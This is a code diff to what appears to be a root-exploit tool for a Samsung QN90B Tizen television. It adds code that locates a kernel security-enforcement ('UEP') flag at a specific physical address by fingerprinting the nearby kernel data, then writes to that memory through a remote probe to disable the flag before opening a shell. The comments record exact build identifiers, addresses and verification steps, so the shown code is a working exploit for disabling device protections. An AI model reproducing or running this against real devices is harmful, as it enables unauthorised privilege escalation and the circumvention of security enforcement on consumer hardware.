@@ -52,7 +52,21 @@ REMOTE_DISPLAY_CONTROL_RUNTIME_CONFIG = (
 )
 SCAN_START = "0x20000000"
 SCAN_LENGTH = "0x4a000000"
-UEP_GATE_PHYSICAL = "0x208c26c4"
+# UEP enforcement flag, from offline review of the running slot-5 kernel
+# (build T-PTMAKUC-REL-202602250225, SHA-256 49a11f67...65e8).  The virtual
+# address is 0xc08c26c4 and the neighbouring .data is:
+#   0xc08c26c0 = 0xc07bd300  (pointer to "Using PIO, %d-bit mode\n")
+#   0xc08c26c4 = 1 enforcing, 0 disabled   <- the flag, one-way until reboot
+#   0xc08c26c8 = 0
+#   0xc08c26cc = 0x4e2
+# The physical address is runtime-layout dependent.  On this exact build the
+# driver-owned positive control succeeded and 0x208c26c0 returned the exact
+# neighbourhood fingerprint, validating 0x208c26c4 as the live flag address.
+# The uImage-derived 0x808c26c0 stalled before returning words; do not retry it.
+# Never write to a candidate whose fingerprint did not match.
+UEP_GATE_CANDIDATES = ("0x208c26c0",)
+UEP_GATE_FLAG_WORD = 1
+UEP_GATE_FINGERPRINT = {0: "c07bd300", 2: "00000000", 3: "000004e2"}
 UEP_GATE_CLOSED = "0x00000001"
 UEP_GATE_OPEN = "0x00000000"
 STOCK_SOCAT = PurePosixPath("/opt/usr/apps/com.samsung.tizen.smartthings-hub/bin/socat")
@@ -60,6 +74,27 @@ STOCK_SOCAT = PurePosixPath("/opt/usr/apps/com.samsung.tizen.smartthings-hub/bin
 
 class Qn90bError(RuntimeError):
     pass
+
+
+def _uep_probe_words(output: str, label: str = "words") -> list[str]:
+    """Parse one word dump emitted by FdetProbe's read/write modes."""
+    for line in output.splitlines():
+        fields = line.split()
+        if len(fields) >= 2 and fields[0] == label and fields[1] == "word=0":
+            return [field.lower().zfill(8) for field in fields[2:]]
+    return []
+
+
+def _uep_gate_is_valid(words: list[str]) -> bool:
+    """Accept only a page whose packaged neighbours match this kernel image."""
+    if len(words) < 4:
+        return False
+    if any(words[index] != value for index, value in UEP_GATE_FINGERPRINT.items()):
+        return False
+    return words[UEP_GATE_FLAG_WORD] in {
+        UEP_GATE_CLOSED.removeprefix("0x"),
+        UEP_GATE_OPEN.removeprefix("0x"),
+    }
 
 
 @dataclass(frozen=True)
@@ -177,33 +212,48 @@ class Qn90bRootExploit:
         Qn90bRootEvidence(result.output).validate()
         return result
 
-    def read_uep_gate(self) -> CaptureResult:
-        invocation = shlex.join(
-            (
-                "/usr/bin/dotnet",
-                str(REMOTE_PROBE),
-                "rw",
-                UEP_GATE_PHYSICAL,
-                "1",
+    def _locate_uep_gate(self) -> tuple[str, CaptureResult]:
+        """Find the flag by fingerprint instead of assuming a DRAM base."""
+        attempts: list[str] = []
+        for address in UEP_GATE_CANDIDATES:
+            invocation = shlex.join(
+                ("/usr/bin/dotnet", str(REMOTE_PROBE), "rw", address, "4")
             )
+            result = self.sdb.capture(invocation, timeout=15.0)
+            if _uep_gate_is_valid(_uep_probe_words(result.output)):
+                return address, result
+            attempts.append(f"{address}: {result.output.strip() or 'no probe output'}")
+        detail = "\n".join(attempts)
+        raise Qn90bError(
+            "QN90B UEP gate did not match its neighbourhood fingerprint at the "
+            "validated physical address; refusing to trust the result:\n" + detail
         )
-        return self.sdb.capture(invocation, timeout=15.0)
+
+    def read_uep_gate(self) -> CaptureResult:
+        return self._locate_uep_gate()[1]
 
     def disable_uep(self) -> CaptureResult:
+        address, before = self._locate_uep_gate()
+        if _uep_probe_words(before.output)[UEP_GATE_FLAG_WORD] == UEP_GATE_OPEN.removeprefix("0x"):
+            return before
         invocation = shlex.join(
             (
                 "/usr/bin/dotnet",
                 str(REMOTE_PROBE),
                 "wwi",
-                UEP_GATE_PHYSICAL,
-                "0",
+                address,
+                str(UEP_GATE_FLAG_WORD),
                 UEP_GATE_CLOSED,
                 UEP_GATE_OPEN,
             )
         )
         result = self.sdb.capture(invocation, timeout=15.0)
-        if UEP_GATE_OPEN not in result.output:
-            raise Qn90bError("QN90B UEP transition did not report the open value")
+        after = _uep_probe_words(result.output, "words_after")
+        if not _uep_gate_is_valid(after) or after[UEP_GATE_FLAG_WORD] != UEP_GATE_OPEN.removeprefix("0x"):
+            raise Qn90bError(
+                "QN90B UEP transition was not verified by a guarded read-back:\n"
+                + result.output
+            )
         return result
 
     def shell(self, *, timeout: float = 45.0) -> None:
